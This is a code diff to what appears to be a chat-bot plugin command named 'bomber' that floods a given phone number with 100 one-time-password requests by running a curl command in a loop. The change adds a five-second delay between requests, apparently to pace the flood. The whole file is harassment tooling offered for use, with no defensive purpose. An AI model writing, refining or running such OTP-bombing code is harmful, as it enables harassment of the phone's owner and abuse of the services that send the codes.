@@ -1,6 +1,9 @@
 const axios = require('axios'); // Import axios library
 const { exec } = require('child_process'); // Import exec for running cURL command
 
+// Helper function to add delay
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 exports.run = {
     usage: ['bomber'],
     use: 'number without 0 and 92',
@@ -23,8 +26,12 @@ exports.run = {
                 client.sendReact(m.chat, '🕒', m.key);
                 client.reply(m.chat, `Starting OTP bombing on ${mobileNumber}. Please wait...`, m);
 
-                // Send 100 OTP requests
+                // Send 100 OTP requests with 5-second delay
                 for (let i = 0; i < 100; i++) {
+                    // Wait for 5 seconds before sending the next OTP
+                    await sleep(5000); 
+
+                    // Execute the curl command
                     exec(curlCommand, (error, stdout, stderr) => {
                         if (error) {
                             console.error(`Error sending OTP: ${error.message}`);
@@ -34,7 +41,7 @@ exports.run = {
                     });
                 }
 
-                return client.reply(m.chat, '100 OTPs have been sent!', m);
+                return client.reply(m.chat, '100 OTPs have been sent with a delay of 5 seconds between each!', m);
             }
         } catch (e) {
             console.error(e); // Log the error for debugging
